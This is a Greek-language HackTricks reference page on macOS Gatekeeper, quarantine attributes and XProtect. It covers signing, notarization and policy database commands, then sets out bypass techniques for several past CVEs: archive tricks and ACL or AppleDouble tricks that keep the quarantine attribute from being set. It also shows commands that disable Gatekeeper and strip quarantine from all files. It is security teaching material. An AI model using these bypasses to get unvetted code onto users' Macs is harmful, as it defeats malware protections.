# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** [**💬**](https://emojipedia.org/speech-balloon/) [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ τρικς σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

Το **Gatekeeper** είναι μια λειτουργία ασφαλείας που αναπτύχθηκε για τα λειτουργικά συστήματα Mac, σχεδιασμένη για να εξασφαλίζει ότι οι χρήστες **εκτελούν μόνο αξιόπιστο λογισμικό** στα συστήματά τους. Λειτουργεί με τον **έλεγχο του λογισμικού** που ένας χρήστης κατεβάζει και προσπαθεί να ανοίξει από **πηγές εκτός του App Store**, όπως μια εφαρμογή, ένα πρόσθετο ή ένα πακέτο εγκατάστασης.

Ο βασικός μηχανισμός του Gatekeeper βρίσκεται στη διαδικασία του **έλεγχου**. Ελέγχει εάν το κατεβασμένο λογισμικό είναι **υπογεγραμμένο από αναγνωρισμένο προγραμματιστή**, εξασφαλίζοντας την αυθεντικότητα του λογισμικού. Επιπλέον, ελέγχει εάν το λογισμικό έχει **επικυρωθεί από την Apple**, επιβεβαιώνοντας ότι είναι απαλλαγμένο από γνωστό κακόβουλο περιεχόμενο και δεν έχει τροποποιηθεί μετά την επικύρωση.

Επιπλέον, το Gatekeeper ενισχύει τον έλεγχο και την ασφάλεια του χρήστη με το **ζήτημα έγκρισης από τον χρήστη** για το άνοιγμα του κατεβασμένου λογισμικού για πρώτη φορά. Αυτός ο μηχανισμός ασφαλείας βοηθά να αποτραπεί η ακούσια εκτέλεση πιθανώς επιβλαβούς εκτελέσιμου κώδικα που ο χρήστης μπορεί να έχει παρερμηνεύσει ως ακίνδυνο αρχείο δεδομένων.

### Υπογραφές Εφαρμογών

Οι υπογραφές εφαρμογών, γνωστές επίσης ως υπογραφές κώδικα, είναι ένα κρίσιμο στοιχείο της ασφάλειας της Apple. Χρησιμοποιούνται για να **επαληθεύσουν την ταυτότητα του συγγραφέα του λογισμικού** (του προγραμματιστή) και να εξασφαλίσουν ότι ο κώδικας δεν έχει τροποποιηθεί από την τελευταία φορά που υπογράφηκε.

Ας δούμε πώς λειτουργεί:

1. **Υπογραφή της Εφαρμογής:** Όταν ένας προγραμματιστής είναι έτοιμος να διανείμει την εφαρμογή του, **υπογράφει την εφαρμογή χρησιμοποιώντας ένα ιδιωτικό κλειδί**. Αυτό το ιδιωτικό κλειδί συσχετίζεται με ένα **πιστοποιητικό που η Apple εκδίδει στον προγραμματιστή** όταν εγγράφεται στο Apple Developer Program. Η διαδικασία υπογραφής περιλαμβάνει τη δημιουργία ενός κρυπτογραφικού hash όλων των μερών της εφαρμογής και την κρυπτογράφηση αυτού του hash με το ιδιωτικό κλειδί του προγραμματιστή.
2. **Διανομή της Εφαρμογής:** Η υπογεγραμμένη εφαρμογή διανέμεται στους χρήστες μαζί με το πιστοποιητικό του προγραμματιστή, που περιέχει το αντίστοιχο δημόσιο κλειδί.
3. **Επαλήθευση της Εφαρμογής:** Όταν ένας χρήστης κατεβάζει και προσπαθεί να εκτελέσει την εφαρμογή, το λειτουργικό σύστημα Mac χρησιμοποιεί το δημόσιο κλειδί από το πιστοποιητικό του προγραμματιστή για να αποκρυπτογραφήσει το hash. Στη συνέχεια, υπολογίζει ξανά το hash με βάση την τρέχουσα κατάσταση της εφαρμογής και συγκρίνει αυτό με το αποκρυπτογραφημένο hash. Εά

```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```

### Επικύρωση

Η διαδικασία επικύρωσης της Apple λειτουργεί ως μια επιπλέον προστασία για τους χρήστες από πιθανά επιβλαβές λογισμικό. Περιλαμβάνει τον **προγραμματιστή να υποβάλει την εφαρμογή του για εξέταση** από την **Υπηρεσία Επικύρωσης της Apple**, η οποία δεν πρέπει να συγχέεται με την Αναθεώρηση Εφαρμογών. Αυτή η υπηρεσία είναι ένα **αυτοματοποιημένο σύστημα** που εξετάζει το υποβληθέν λογισμικό για την παρουσία **κακόβουλου περιεχομένου** και οποιαδήποτε πιθανά προβλήματα με την υπογραφή του κώδικα.

Εάν το λογισμικό **περάσει** αυτόν τον έλεγχο χωρίς να προκαλέσει ανησυχίες, η Υπηρεσία Επικύρωσης δημιουργεί ένα εισιτήριο επικύρωσης. Ο προγραμματιστής είναι τότε υποχρεωμένος να **συνδέσει αυτό το εισιτήριο στο λογισμικό του**, μια διαδικασία που ονομάζεται 'συνδεσμοποίηση'. Επιπλέον, το εισιτήριο επικύρωσης δημοσιεύεται επίσης στο διαδίκτυο, όπου το Gatekeeper, η τεχνολογία ασφαλείας της Apple, μπορεί να το ανακτήσει.

Κατά την πρώτη εγκατάσταση ή εκτέλεση του λογισμικού από τον χρήστη, η ύπαρξη του εισιτηρίου επικύρωσης - είτε συνδεδεμένου με το εκτελέσιμο είτε βρεθεί στο διαδίκτυο - **ενημερώνει το Gatekeeper ότι το λογισμικό έχει επικυρωθεί από την Apple**. Ως αποτέλεσμα, το Gatekeeper εμφανίζει ένα περιγραφικό μήνυμα στο αρχικό παράθυρο εκκίνησης, που υποδεικνύει ότι το λογισμικό έχει υποβληθεί σε έλεγχο για κακόβουλο περιεχόμενο από την Apple. Με αυτήν τη διαδικασία, ενισχύεται η εμπιστοσύνη των χρηστών στην ασφάλεια του λογισμικού που εγκαθιστούν ή εκτελούν στα συστήματά τους.

### Απαρίθμηση του GateKeeper

Το GateKeeper είναι τόσο **πολλαπλά στοιχεία ασφαλείας** που αποτρέπουν την εκτέλεση μη αξιόπιστων εφαρμογών, όσο και **ένα από τα στοιχεία**.

Είναι δυνατόν να δείτε την **κατάσταση** του GateKeeper με:

```bash
# Check the status
spctl --status
```

{% hint style="danger" %}
Σημείωση ότι οι έλεγχοι υπογραφής του GateKeeper πραγματοποιούνται μόνο σε **αρχεία με το χαρακτηριστικό Καραντίνα**, όχι σε κάθε αρχείο.
{% endhint %}

Ο GateKeeper θα ελέγξει αν σύμφωνα με τις **προτιμήσεις και την υπογραφή** μια δυαδική μπορεί να εκτελεστεί:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

Η βάση δεδομένων που διατηρεί αυτή τη διαμόρφωση βρίσκεται στο **`/var/db/SystemPolicy`**. Μπορείτε να ελέγξετε αυτήν τη βάση δεδομένων ως ριζικός χρήστης με:

```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```

Παρατηρήστε πώς ο πρώτος κανόνας τελείωσε σε "**App Store**" και ο δεύτερος σε "**Developer ID**" και ότι στην προηγούμενη εικόνα ήταν **ενεργοποιημένη η εκτέλεση εφαρμογών από το App Store και από τους εντοπισμένους προγραμματιστές**.\
Εάν **τροποποιήσετε** αυτήν τη ρύθμιση σε App Store, οι κανόνες "**Notarized Developer ID" θα εξαφανιστούν**.

Υπάρχουν επίσης χιλιάδες κανόνες τύπου GKE:

```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```

Αυτά είναι τα hashes που προέρχονται από τα **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** και **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Ή μπορείτε να αναφέρετε τις προηγούμενες πληροφορίες με:

```bash
sudo spctl --list
```

Οι επιλογές **`--master-disable`** και **`--global-disable`** του **`spctl`** θα απενεργοποιήσουν εντελώς αυτούς τους έλεγχους υπογραφής:

```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```

Όταν είναι πλήρως ενεργοποιημένο, θα εμφανιστεί μια νέα επιλογή:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

Είναι δυνατόν να **ελεγχθεί εάν μια εφαρμογή θα επιτραπεί από το GateKeeper** με:

```bash
spctl --assess -v /Applications/App.app
```

Είναι δυνατόν να προστεθούν νέοι κανόνες στο GateKeeper για να επιτραπεί η εκτέλεση συγκεκριμένων εφαρμογών με:

```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```

### Αρχεία Καραντίνας

Κατά την **λήψη** μιας εφαρμογής ή αρχείου, συγκεκριμένες εφαρμογές του macOS, όπως οι περιηγητές ιστού ή οι πελάτες ηλεκτρονικού ταχυδρομείου, **προσθέτουν ένα επεκτεινόμενο χαρακτηριστικό αρχείου**, γνωστό ως "**σημαία καραντίνας**", στο κατεβασμένο αρχείο. Αυτό το χαρακτηριστικό λειτουργεί ως μέτρο ασφαλείας για να **επισημάνει το αρχείο** ως προερχόμενο από μη έμπιστη πηγή (το διαδίκτυο) και πιθανώς να φέρει κινδύνους. Ωστόσο, όχι όλες οι εφαρμογές προσθέτουν αυτό το χαρακτηριστικό, για παράδειγμα, οι συνηθισμένοι πελάτες BitTorrent παρακάμπτουν συνήθως αυτήν τη διαδικασία.

**Η παρουσία της σημαίας καραντίνας ενημερώνει το χαρακτηριστικό ασφαλείας Gatekeeper του macOS όταν ο χρήστης προσπαθεί να εκτελέσει το αρχείο**.

Στην περίπτωση που **η σημαία καραντίνας δεν είναι παρούσα** (όπως στα αρχεία που λήφθηκαν μέσω ορισμένων πελατών BitTorrent), οι ελέγχοι του Gatekeeper **μπορεί να μην πραγματοποιηθούν**. Επομένως, οι χρήστες πρέπει να είναι προσεκτικοί όταν ανοίγουν αρχεία που έχουν ληφθεί από λιγότερο ασφαλείς ή άγνωστες πηγές.

{% hint style="info" %}
Ο **έλεγχος** της **εγκυρότητας** των υπογραφών κώδικα είναι μια διαδικασία που απαιτεί πολλούς πόρους και περιλαμβάνει τη δημιουργία κρυπτογραφικών **κατακερματισμών** του κώδικα και όλων των συνοδευτικών πόρων του. Επιπλέον, ο έλεγχος της εγκυρότητας του πιστοποιητικού περιλαμβάνει μια **διαδικτυακή έλεγχο** στους διακομιστές της Apple για να δει αν έχει ανακληθεί μετά την έκδοσή του. Για αυτούς τους λόγους, ο πλήρης έλεγχος της υπογραφής κώδικα και της επικύρωσης δεν είναι **πρακτικός για να εκτελείται κάθε φορά που εκκινείται μια εφαρμογή**.

Για αυτόν τον λόγο, αυτοί οι έλεγχοι **εκτελούνται μόνο όταν εκτελούνται εφαρμογές με το χαρακτηριστικό καραντίνας**.
{% endhint %}

{% hint style="warning" %}
Αυτό το χαρακτηριστικό πρέπει να **ορίζεται από την εφαρμογή που δημιουργεί/κατεβάζει** το αρχείο.

Ωστόσο, τα αρχεία που είναι απομονωμένα θα έχουν αυτό το χαρακτηριστικό ορισμένο σε κάθε αρχείο που δημιουργούν. Και οι μη απομονωμένες εφαρμογές μπορούν να το ορίσουν μόνες τους ή να καθορίσουν το κλειδί [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) στο **Info.plist**, το οποίο θα κάνει το σύστημα να ορίσει το επεκτεινόμενο χαρακτηριστικό `com.apple.quarantine` στα δημιουργούμενα αρχεία.
{% endhint %}

Είναι δυνατόν να **ελέγξετε την κατάστασή του και να ενεργοποιήσετε/απενεργοποιήσετε** (απαιτεί δικαιώματα διαχειριστή) με την εντολή:

```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```

Μπορείτε επίσης να **βρείτε αν ένα αρχείο έχει το επιπλέον χαρακτηριστικό καραντίνας** με την εντολή:

```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```

Ελέγξτε τη **τιμή** των **επεκταμένων** **χαρακτηριστικών** και βρείτε την εφαρμογή που έγραψε το χαρακτηριστικό καραντίνας με:

```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```

Πραγματικά, ένας διεργασία "μπορεί να ορίσει σημαίες καραντίνας στα αρχεία που δημιουργεί" (προσπάθησα να εφαρμόσω τη σημαία USER\_APPROVED σε ένα δημιουργημένο αρχείο, αλλά δεν την εφάρμοσε):

<details>

<summary>Πηγαίος Κώδικας εφαρμογής σημαιών καραντίνας</summary>

\`\`\`c #include #include

enum qtn\_flags { QTN\_FLAG\_DOWNLOAD = 0x0001, QTN\_FLAG\_SANDBOX = 0x0002, QTN\_FLAG\_HARD = 0x0004, QTN\_FLAG\_USER\_APPROVED = 0x0040, };

\#define qtn\_proc\_alloc \_qtn\_proc\_alloc #define qtn\_proc\_apply\_to\_self \_qtn\_proc\_apply\_to\_self #define qtn\_proc\_free \_qtn\_proc\_free #define qtn\_proc\_init \_qtn\_proc\_init #define qtn\_proc\_init\_with\_self \_qtn\_proc\_init\_with\_self #define qtn\_proc\_set\_flags \_qtn\_proc\_set\_flags #define qtn\_file\_alloc \_qtn\_file\_alloc #define qtn\_file\_init\_with\_path \_qtn\_file\_init\_with\_path #define qtn\_file\_free \_qtn\_file\_free #define qtn\_file\_apply\_to\_path \_qtn\_file\_apply\_to\_path #define qtn\_file\_set\_flags \_qtn\_file\_set\_flags #define qtn\_file\_get\_flags \_qtn\_file\_get\_flags #define qtn\_proc\_set\_identifier \_qtn\_proc\_set\_identifier

typedef struct \_qtn\_proc \*qtn\_proc\_t; typedef struct \_qtn\_file \*qtn\_file\_t;

int qtn\_proc\_apply\_to\_self(qtn\_proc\_t); void qtn\_proc\_init(qtn\_proc\_t); int qtn\_proc\_init\_with\_self(qtn\_proc\_t); int qtn\_proc\_set\_flags(qtn\_proc\_t, uint32\_t flags); qtn\_proc\_t qtn\_proc\_alloc(); void qtn\_proc\_free(qtn\_proc\_t); qtn\_file\_t qtn\_file\_alloc(void); void qtn\_file\_free(qtn\_file\_t qf); int qtn\_file\_set\_flags(qtn\_file\_t qf, uint32\_t flags); uint32\_t qtn\_file\_get\_flags(qtn\_file\_t qf); int qtn\_file\_apply\_to\_path(qtn\_file\_t qf, const char \*path); int qtn\_file\_init\_with\_path(qtn\_file\_t qf, const char _path); int qtn\_proc\_set\_identifier(qtn\_proc\_t qp, const char_ bundleid);

int main() {

qtn\_proc\_t qp = qtn\_proc\_alloc(); qtn\_proc\_set\_identifier(qp, "xyz.hacktricks.qa"); qtn\_proc\_set\_flags(qp, QTN\_FLAG\_DOWNLOAD | QTN\_FLAG\_USER\_APPROVED); qtn\_proc\_apply\_to\_self(qp); qtn\_proc\_free(qp);

FILE \*fp; fp = fopen("thisisquarantined.txt", "w+"); fprintf(fp, "Hello Quarantine\n"); fclose(fp);

return 0;

}

````
</details>

Και **αφαιρέστε** αυτήν την ιδιότητα με:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
````

Και βρείτε όλα τα καραντιναρισμένα αρχεία με:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Οι πληροφορίες της καραντίνας αποθηκεύονται επίσης σε μια κεντρική βάση δεδομένων που διαχειρίζεται η LaunchServices στο **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

**Quarantine.kext**

Η επέκταση πυρήνα είναι διαθέσιμη μόνο μέσω της **προσωρινής μνήμης του πυρήνα στο σύστημα**. Ωστόσο, μπορείτε να κατεβάσετε το **Kernel Debug Kit από τη διεύθυνση https://developer.apple.com/**, το οποίο θα περιέχει μια συμβολική έκδοση της επέκτασης.

#### XProtect

Το XProtect είναι μια ενσωματωμένη λειτουργία **αντι-κακόβουλου λογισμικού** στο macOS. Το XProtect **ελέγχει κάθε εφαρμογή όταν την εκτελέσετε για πρώτη φορά ή την τροποποιήσετε, σε σχέση με τη βάση δεδομένων του** γνωστού κακόβουλου λογισμικού και των μη ασφαλών τύπων αρχείων. Όταν κατεβάζετε ένα αρχείο μέσω ορισμένων εφαρμογών, όπως το Safari, το Mail ή το Messages, το XProtect σαρώνει αυτόματα το αρχείο. Εάν ταιριάζει με οποιοδήποτε γνωστό κακόβουλο λογισμικό στη βάση δεδομένων του, το XProtect θα **αποτρέψει την εκτέλεση του αρχείου** και θα σας ειδοποιήσει για τον κίνδυνο.

Η βάση δεδομένων του XProtect ενημερώνεται **τακτικά** από την Apple με νέους ορισμούς κακόβουλου λογισμικού, και αυτές οι ενημερώσεις λαμβάνονται και εγκαθίστανται αυτόματα στο Mac σας. Αυτό εξασφαλίζει ότι το XProtect είναι πάντα ενημερωμένο με τις τελευταίες γνωστές απειλές.

Ωστόσο, αξίζει να σημειωθεί ότι το **XProtect δεν είναι μια πλήρως λειτουργική λύση αντιιούστρωσης**. Ελέγχει μόνο μια συγκεκριμένη λίστα γνωστών απειλών και δεν πραγματοποιεί σάρωση κατά την πρόσβαση όπως η πλειονότητα των λογισμικών αντιιούστρωσης.

Μπορείτε να λάβετε πληροφορίες για την τελευταία ενημέρωση του XProtect εκτελώντας:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

Το XProtect βρίσκεται σε προστατευμένη τοποθεσία SIP στο **/Library/Apple/System/Library/CoreServices/XProtect.bundle** και μέσα στο bundle μπορείτε να βρείτε τις πληροφορίες που χρησιμοποιεί το XProtect:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Επιτρέπει στον κώδικα με αυτά τα cdhashes να χρησιμοποιεί παλαιές εξουσιοδοτήσεις.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Λίστα προσθέτων και επεκτάσεων που δεν επιτρέπεται να φορτωθούν μέσω του BundleID και TeamID ή που υποδεικνύουν μια ελάχιστη έκδοση.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Κανόνες Yara για την ανίχνευση κακόβουλου λογισμικού.
* **`XProtect.bundle/Contents/Resources/gk.db`**: Βάση δεδομένων SQLite3 με κατακερματισμένες εφαρμογές και TeamIDs που έχουν αποκλειστεί.

Σημειώστε ότι υπάρχει μια άλλη εφαρμογή στο **`/Library/Apple/System/Library/CoreServices/XProtect.app`** που σχετίζεται με το XProtect και δεν συμμετέχει στη διαδικασία του Gatekeeper.

#### Όχι Gatekeeper

Σημειώστε ότι το Gatekeeper **δεν εκτελείται κάθε φορά** που εκτελείτε μια εφαρμογή, απλώς ο _**AppleMobileFileIntegrity**_ (AMFI) θα επιβεβαιώσει μόνο τις υπογραφές του εκτελέσιμου κώδικα όταν εκτελείτε μια εφαρμογή που έχει ήδη εκτελεστεί και επιβεβαιωθεί από το Gatekeeper.

Επομένως, προηγουμένως ήταν δυνατό να εκτελεστεί μια εφαρμογή για να την κρυφτεί με το Gatekeeper, στη συνέχεια να **τροποποιηθούν μη εκτελέσιμα αρχεία της εφαρμογής** (όπως τα αρχεία Electron asar ή NIB) και αν δεν υπήρχαν άλλες προστασίες, η εφαρμογή εκτελούνταν με τις **κακόβουλες** προσθήκες.

Ωστόσο, τώρα αυτό δεν είναι δυνατό επειδή το macOS **αποτρέπει την τροποποίηση αρχείων** μέσα στα πακέτα των εφαρμογών. Έτσι, αν προσπαθήσετε την επίθεση [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), θα διαπιστώσετε ότι δεν είναι πλέον δυνατή η κατάχρησή της επειδή μετά την εκτέλεση της εφαρμογής για να την κρυφτεί με το Gatekeeper, δεν θα μπορείτε να τροποποιήσετε το πακέτο. Και αν αλλάξετε, για παράδειγμα, το όνομα του καταλόγου Contents σε NotCon (όπως υποδεικνύεται στην εκμετάλλευση), και στη συνέχεια εκτελέσετε τον κύριο δυαδικό της εφαρμογής για να την κρυφτεί με το Gatekeeper, θα προκαλέσει ένα σφάλμα και δεν θα εκτελεστεί.

### Παράκαμψη του Gatekeeper

Οποιοδήποτε τρόπος παράκαμψης του Gatekeeper (καταφέρνοντας να κάνετε τον χρήστη να κατεβάσει και να εκτελέσει κάτι όταν ο Gatekeeper θα έπρεπε να το απαγορεύσει) θεωρείται ευπάθεια στο macOS. Αυτά είναι μερικά CVE που έχουν ανατεθεί σε τεχνικές που επέτρεπαν την παράκαμψη του Gatekeeper στο παρελθόν:

#### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Παρατηρήθηκε ότι εάν χρησιμοποιηθεί το **Archive Utility** για την αποσυμπίεση, τα αρχεία με **μονοπάτια που υπερβαίνουν τους 886 χαρακτήρες** δεν λαμβάνουν το επεκτεινόμενο χαρακτηριστικό com.apple.quarantine. Αυτή η κατάσταση επιτρέπει κατά λάθος σε αυτά τα αρχεία να **παρακάμψουν τους έλεγχους ασφαλείας** του Gatekeeper.

Ελέγξτε την [**αρχική αναφορά**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) για περισσότερες πληροφορίες.

#### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Όταν δημιουργείται μια εφαρμογή με το **Automator**, οι πληροφορίες για το τι χρειάζεται να εκτελεστεί βρίσκονται μέσα στο `application.app/Contents/document.wflow` και όχι στο εκτελέσιμο. Το εκτελέσιμο είναι απλώς ένα γενικό δυαδικό του Automator που ονομάζεται **Automator Application Stub**.

Επομένως, μπορείτε να κάνετε το `application.app/Contents/MacOS/Automator\ Application\ Stub` **να δείχνει με ένα συμβολικό σύνδεσμο σε ένα άλλο Automator Application Stub μέσα στο σύστημα** και θα εκτελεί αυτό που βρίσκεται μέσα στο `document.wflow` (το σενάριό σας) **χωρίς να ενεργοποιεί τον Gatekeeper** επειδή το πραγματικό εκτελέσιμο δεν έχει το quarantine xattr.

Παράδειγμα αναμενόμενης τοποθεσίας: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Ελέγξτε την [**αρχική αναφορά**](https://ronmasas.com/posts/bypass-macos-gatekeeper) για περισσότερες πληροφορίες.

#### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Σε αυτήν την παράκαμψη δημιουργήθηκε ένα αρχείο zip με μια εφαρμογή που ξεκινά τη συμπίεση από το `application.app/Contents` αντί για το `application.app`. Επομένως, το **χαρακτηριστικό καραντίνας** εφαρμόστηκε σε όλα τα **αρχεία από το `application.app/Contents`** αλλά **όχι στο `application.app`**, που ήταν αυτό που ελέγχονταν από

```bash
zip -r test.app/Contents test.zip
```

Ελέγξτε την [**αρχική αναφορά**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) για περισσότερες πληροφορίες.

#### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Ακόμα κι αν οι συστατικές είναι διαφορετικές, η εκμετάλλευση αυτής της ευπάθειας είναι πολύ παρόμοια με την προηγούμενη. Σε αυτήν την περίπτωση, θα δημιουργήσουμε ένα Apple Archive από το **`application.app/Contents`**, έτσι ώστε το **`application.app` να μην λάβει το χαρακτηριστικό καραντίνας** όταν αποσυμπιέζεται από το **Archive Utility**.

```bash
aa archive -d test.app/Contents -o test.app.aar
```

Ελέγξτε την [**αρχική αναφορά**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) για περισσότερες πληροφορίες.

#### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

Το ACL **`writeextattr`** μπορεί να χρησιμοποιηθεί για να αποτρέψει οποιονδήποτε από το να γράψει ένα χαρακτηριστικό σε ένα αρχείο:

```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```

Επιπλέον, η μορφή αρχείου **AppleDouble** αντιγράφει ένα αρχείο συμπεριλαμβάνοντας τις ACEs του.

Στον [**πηγαίο κώδικα**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατό να δούμε ότι η αναπαράσταση κειμένου του ACL που αποθηκεύεται μέσα στο xattr με το όνομα **`com.apple.acl.text`** θα οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Έτσι, αν συμπιέσετε μια εφαρμογή σε ένα αρχείο zip με τη μορφή αρχείου **AppleDouble** και έχετε ένα ACL που αποτρέπει την εγγραφή άλλων xattrs σε αυτό... το xattr της καραντίνας δεν θα οριστεί στην εφαρμογή:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Ελέγξτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.

Σημειώστε ότι αυτό μπορεί επίσης να εκμεταλλευτεί με το AppleArchives:

```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```

#### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Ανακαλύφθηκε ότι το **Google Chrome δεν έθετε το χαρακτηριστικό καραντίνας** σε κατεβασμένα αρχεία λόγω ορισμένων εσωτερικών προβλημάτων του macOS.

#### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Τα αρχεία μορφής AppleDouble αποθηκεύουν τα χαρακτηριστικά ενός αρχείου σε ένα ξεχωριστό αρχείο που ξεκινά με `._`, αυτό βοηθά στην αντιγραφή των χαρακτηριστικών των αρχείων **σε διάφορες συσκευές macOS**. Ωστόσο, παρατηρήθηκε ότι μετά την αποσυμπίεση ενός αρχείου AppleDouble, το αρχείο που ξεκινά με `._` **δεν είχε το χαρακτηριστικό καραντίνας**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

